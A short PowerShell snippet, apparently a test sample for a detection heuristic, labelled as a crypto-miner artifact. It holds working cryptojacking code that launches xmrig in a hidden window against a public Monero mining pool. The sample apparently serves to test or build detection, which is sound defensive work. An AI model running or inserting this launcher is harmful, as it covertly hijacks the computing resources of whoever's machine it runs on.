# Heuristic target: crypto-miner artifact
$miner_url = "stratum+tcp://xmr-eu1.nanopool.org:14444"
Start-Process "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command { ./xmrig -o $miner_url }"
